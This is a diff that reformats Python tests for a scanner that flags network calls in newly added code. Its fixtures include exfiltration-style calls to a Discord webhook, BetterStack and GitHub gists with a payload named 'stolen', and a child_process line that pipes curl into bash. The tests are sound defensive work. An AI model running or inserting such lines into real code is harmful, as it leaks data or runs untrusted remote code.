@@ -2835,15 +2835,30 @@ def test_net_calls_solana_rpc_js():
 
 
 def test_net_calls_discord_webhook_js():
-    assert _added_lines_have_net_calls(["fetch('https://discord.com/api/webhooks/123/secret', opts)"], ".js") is True
+    assert (
+        _added_lines_have_net_calls(
+            ["fetch('https://discord.com/api/webhooks/123/secret', opts)"], ".js"
+        )
+        is True
+    )
 
 
 def test_net_calls_betterstack_py():
-    assert _added_lines_have_net_calls(["requests.post('https://logs.betterstack.com/logs', data=payload)"], ".py") is True
+    assert (
+        _added_lines_have_net_calls(
+            ["requests.post('https://logs.betterstack.com/logs', data=payload)"], ".py"
+        )
+        is True
+    )
 
 
 def test_net_calls_github_gist_py():
-    assert _added_lines_have_net_calls(["httpx.post('https://api.github.com/gists', json=stolen)"], ".py") is True
+    assert (
+        _added_lines_have_net_calls(
+            ["httpx.post('https://api.github.com/gists', json=stolen)"], ".py"
+        )
+        is True
+    )
 
 
 def test_net_calls_window_ethereum_js():
@@ -2990,8 +3005,7 @@ def test_child_process_in_lib_file_sets_net_calls(tmp_path):
         tmp_path / "new",
         {
             "lib/exec.js": (
-                "const cp = require('child_process');\n"
-                "cp.execSync(`curl ${url} | bash`);\n"
+                "const cp = require('child_process');\ncp.execSync(`curl ${url} | bash`);\n"
             )
         },
     )
